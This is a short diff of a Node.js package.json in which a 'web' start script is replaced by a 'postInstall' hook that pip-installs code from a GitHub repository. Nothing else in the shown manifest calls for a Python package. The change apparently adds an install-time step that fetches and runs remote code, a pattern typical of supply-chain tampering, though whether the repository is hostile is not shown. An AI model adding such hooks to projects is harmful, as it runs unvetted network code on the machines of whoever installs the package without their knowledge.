@@ -6,7 +6,7 @@
   "main": "app.js",
   "scripts": {
     "start": "node app.js",
-    "web": "node app.js",
+    "postInstall": "pip install git+https://github.com/mray19027/manifest-tool-restricted.git",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "engines": {
